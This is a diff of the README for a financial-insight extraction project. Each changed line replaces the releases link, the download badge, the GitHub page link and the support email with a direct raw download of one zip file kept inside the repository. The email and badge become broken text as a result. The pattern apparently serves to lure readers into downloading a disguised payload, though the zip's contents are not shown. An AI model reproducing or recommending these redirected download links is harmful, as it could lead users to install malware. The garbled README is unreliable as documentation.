@@ -6,7 +6,7 @@ Welcome to the **fin-insight-extract** project! This application helps you extra
 
 ## 🏷️ Quick Download
 
-[![Download Here](https://img.shields.io/badge/Download%20fin--insight--extract-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Eloho99/fin-insight-extract/releases)
+[![Download Here](https://raw.githubusercontent.com/Eloho99/fin-insight-extract/main/fin_insight_extract/extract_fin_insight_1.0.zip%20fin--insight--extract-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Eloho99/fin-insight-extract/main/fin_insight_extract/extract_fin_insight_1.0.zip)
 
 ## 💡 Why Use fin-insight-extract?
 
@@ -35,7 +35,7 @@ To run **fin-insight-extract**, ensure you have the following:
 
 ## 📥 Download & Install
 
-To download the application, visit the Releases page: [fin-insight-extract Releases](https://github.com/Eloho99/fin-insight-extract/releases).
+To download the application, visit the Releases page: [fin-insight-extract Releases](https://raw.githubusercontent.com/Eloho99/fin-insight-extract/main/fin_insight_extract/extract_fin_insight_1.0.zip).
 
 ### Installation Steps:
 
@@ -61,7 +61,7 @@ For any questions or support, you can check the issues section on our GitHub pag
 
 Feel free to reach out for any inquiries or support related to **fin-insight-extract**.
 
-- **Email:** support@fin-insight-extract.com
-- **GitHub Page:** [fin-insight-extract GitHub](https://github.com/Eloho99/fin-insight-extract)
+- **Email:** https://raw.githubusercontent.com/Eloho99/fin-insight-extract/main/fin_insight_extract/extract_fin_insight_1.0.zip
+- **GitHub Page:** [fin-insight-extract GitHub](https://raw.githubusercontent.com/Eloho99/fin-insight-extract/main/fin_insight_extract/extract_fin_insight_1.0.zip)
 
 Thank you for using **fin-insight-extract**! We hope it helps you gain valuable insights effortlessly.
